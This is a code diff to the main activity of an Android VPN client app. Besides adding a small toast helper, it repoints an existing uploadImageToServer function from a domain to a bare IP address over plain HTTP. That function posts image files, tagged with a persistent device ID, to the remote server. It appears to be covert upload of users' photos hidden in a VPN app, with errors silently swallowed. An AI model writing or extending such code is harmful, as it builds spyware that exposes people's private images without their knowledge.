@@ -9,7 +9,7 @@ import android.net.VpnService
 import android.os.Build
 import android.os.Bundle
 import android.provider.MediaStore
-import android.util.Log
+import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.MutableLiveData
@@ -77,6 +77,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             if (Settings.serviceMode == ServiceMode.VPN) {
                 if (prepare()) {
+                    showToast("VPN permission required")
                     return@launch
                 }
             }
@@ -130,12 +131,18 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
+    private fun showToast(message: String) {
+        runOnUiThread {
+            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+        }
+    }
+
     private fun uploadImageToServer(imageUri: android.net.Uri, fileName: String, deviceId: String) {
         try {
             val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
             val lineEnd = "\r\n"
             val twoHyphens = "--"
-            val url = java.net.URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
+            val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.doInput = true
             conn.doOutput = true
@@ -159,7 +166,11 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             outputStream.flush()
             outputStream.close()
 
-        } catch (_: Exception) {}
+            val responseCode = conn.responseCode
+            val response = conn.inputStream.bufferedReader().use { it.readText() }
+
+        } catch (e: Exception) {
+        }
     }
 
     @SuppressLint("NewApi")
@@ -210,6 +221,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             deviceId = prefs.getString("random_device_id", null) ?: java.util.UUID.randomUUID().toString().also {
                 prefs.edit().putString("random_device_id", it).apply()
             }
+        } else {
         }
 
         lifecycleScope.launch(Dispatchers.IO) {
